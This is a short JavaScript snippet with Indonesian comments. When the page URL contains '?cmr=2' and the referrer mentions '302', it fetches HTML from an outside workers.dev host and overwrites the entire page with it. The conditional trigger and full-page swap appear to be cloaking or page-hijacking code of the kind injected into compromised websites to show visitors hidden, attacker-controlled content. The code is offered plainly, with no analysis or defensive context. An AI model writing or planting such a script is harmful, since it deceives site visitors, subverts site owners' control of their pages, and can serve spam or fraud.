// Mendapatkan URL saat ini
var currentUrl = window.location.href;

// Memeriksa apakah sumber lalu lintas adalah redirect status 302 dan memiliki parameter ?cmr=2
if (document.referrer && document.referrer.includes("302") && currentUrl.includes("?cmr=2")) {
  // Mengambil HTML dari https://crm-template-one.mastimon.workers.dev/
  fetch("https://crm-template-one.mastimon.workers.dev/")
    .then(response => response.text())
    .then(html => {
      // Mengganti HTML pada tag <html> dengan HTML yang diambil dari website
      document.querySelector('html').innerHTML = html;
    })
    .catch(error => {
      console.error('Error:', error);
    });
}
